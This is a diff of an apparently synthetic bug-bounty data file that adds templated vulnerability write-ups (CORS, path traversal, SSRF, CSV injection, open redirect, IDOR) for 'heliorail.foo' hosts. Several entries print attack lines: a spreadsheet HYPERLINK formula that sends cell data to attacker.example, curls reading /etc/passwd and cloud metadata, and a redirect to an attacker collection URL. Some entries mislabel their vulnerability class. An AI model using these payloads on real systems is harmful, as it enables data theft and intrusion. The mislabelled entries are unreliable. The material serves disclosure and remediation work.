+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://maintenance.heliorail.foo/api/me`\n- Preconditions: authenticated user: support agent; app version: Console 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10970,7 +11053,8 @@
           "offset": "5d 13h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://maintenance.heliorail.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11117,7 +11201,8 @@
           "offset": "3d 23h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://iam.heliorail.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11240,7 +11325,8 @@
           "offset": "19h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://iam.heliorail.foo/profile`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11384,7 +11470,8 @@
           "offset": "5d 23h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://iam.heliorail.foo/import`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11519,7 +11606,8 @@
           "offset": "1d 3h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://iam.heliorail.foo/import`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11627,7 +11715,8 @@
           "offset": "1d 10h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://maintenance.heliorail.foo/v2/me`\n- Preconditions: authenticated user: radiologist; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11734,7 +11823,8 @@
           "offset": "2d 3h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://iam.heliorail.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11898,7 +11988,8 @@
           "offset": "7d 19h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://iam.heliorail.foo/export`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12010,7 +12101,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://maintenance.heliorail.foo/api/me`\n- Preconditions: authenticated user: citizen; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12134,7 +12226,8 @@
           "offset": "1d",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://iam.heliorail.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12242,7 +12335,8 @@
           "offset": "1d 20h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://iam.heliorail.foo/profile`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12366,7 +12460,8 @@
           "offset": "6d 1h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://iam.heliorail.foo/export`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12505,7 +12600,8 @@
           "offset": "6d 2h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://iam.heliorail.foo/api/import`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12616,7 +12712,8 @@
           "offset": "3d 16h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://maintenance.heliorail.foo/import`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12735,7 +12832,8 @@
           "offset": "10h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://maintenance.heliorail.foo/v2/me`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12923,7 +13021,8 @@
           "offset": "9d 17h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://iam.heliorail.foo/api/import`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13059,7 +13158,8 @@
           "offset": "3d 9h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://maintenance.heliorail.foo/console/queue`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -13175,7 +13275,8 @@
           "offset": "4d 17h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://maintenance.heliorail.foo/admin/queue`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -13319,7 +13420,8 @@
           "offset": "2d 14h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://iam.heliorail.foo/export`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13471,7 +13573,8 @@
           "offset": "7d 6h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://iam.heliorail.foo/statements/`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13606,7 +13709,8 @@
           "offset": "3d",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://iam.heliorail.foo/api/me`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13737,7 +13841,8 @@
           "offset": "4d 2h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://iam.heliorail.foo/admin/items`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -13867,7 +13972,8 @@
           "offset": "5d 9h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://maintenance.heliorail.foo/profile`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14005,7 +14111,8 @@
           "offset": "2d 20h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://maintenance.heliorail.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14124,7 +14231,8 @@
           "offset": "5d 6h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://iam.heliorail.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14251,7 +14359,8 @@
           "offset": "7d 16h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://maintenance.heliorail.foo/api/v2/documents/`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14401,7 +14510,8 @@
           "offset": "7d",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://maintenance.heliorail.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14560,7 +14670,8 @@
           "offset": "6d 6h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://iam.heliorail.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14719,7 +14830,8 @@
           "offset": "7d 8h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://maintenance.heliorail.foo/import`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14875,7 +14987,8 @@
           "offset": "1d 16h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://maintenance.heliorail.foo/api/v2/documents/`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15053,7 +15166,8 @@
           "offset": "6d 21h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
